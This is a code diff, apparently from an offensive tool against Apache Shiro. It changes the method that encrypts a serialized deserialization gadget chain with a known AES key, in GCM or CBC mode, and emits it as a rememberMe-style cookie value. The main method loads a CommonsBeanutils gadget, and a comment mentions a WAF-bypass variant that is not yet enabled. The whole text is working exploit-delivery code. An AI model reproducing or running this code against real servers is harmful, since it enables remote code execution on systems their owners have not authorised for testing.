@@ -1,6 +1,8 @@
 package com.summersec.attack.deser.frame;
 
+import com.summersec.attack.Encrypt.CbcEncrypt;
 import com.summersec.attack.Encrypt.GcmEncrypt;
+import com.summersec.attack.Encrypt.ShiroGCM;
 import com.summersec.attack.core.AttackService;
 import com.summersec.attack.deser.payloads.ObjectPayload;
 import com.summersec.attack.deser.util.Gadgets;
@@ -35,20 +37,49 @@ public class Shiro implements FramePayload {
 //            CipherService cipherService = new AesCipherService();
 //            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
 //            encryptpayload = byteSource.getBytes();
-            GcmEncrypt gcmEncrypt = new GcmEncrypt();
-            String byteSource = gcmEncrypt.encrypt(key,serpayload);
+//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
+            ShiroGCM shiroGCM = new ShiroGCM();
+            String byteSource = shiroGCM.encrypt(key,serpayload);
+//            String byteSource = gcmEncrypt.encrypt(key, serpayload);
 //            encryptpayload = byteSource.getBytes();
             System.out.println(shiroKeyWord + "=" + byteSource);
             return shiroKeyWord + "=" + byteSource;
 
         } else {
-            encryptpayload = AesUtil.encrypt(serpayload, bkey);
+//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
+            CbcEncrypt cbcEncrypt = new CbcEncrypt();
+            String byteSource = cbcEncrypt.encrypt(key, serpayload);
+            System.out.println(shiroKeyWord + "=" + byteSource);
+            return shiroKeyWord + "=" + byteSource;
         }
+
 //增加绕waf的方法，暂不开启。by @by3 @liuwa
         //return shiroKeyWord +  "=" +"...." + DatatypeConverter.printBase64Binary(encryptpayload);
-		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
+//		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
 
     }
+//    @Override
+//    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
+//        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
+//        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
+//        byte[] encryptpayload = null;
+//    //        byte[] encryptpayload;
+//        if (AttackService.aesGcmCipherType == 1) {
+//    //            CipherService cipherService = new AesCipherService();
+//    //            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
+//    //            encryptpayload = byteSource.getBytes();
+//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
+//            String byteSource = gcmEncrypt.encrypt(key,serpayload);
+//    //            encryptpayload = byteSource.getBytes();
+//            System.out.println(shiroKeyWord + "=" + byteSource);
+//            return shiroKeyWord + "=" + byteSource;
+//
+//        } else {
+//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
+//        }
+//
+//        return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
+//    }
 
     public static void main(String[] args) throws Exception {
         Class<? extends ObjectPayload> gadgetClazz = (Class<? extends ObjectPayload>) Utils.getPayloadClass("CommonsBeanutilsAttrCompare");
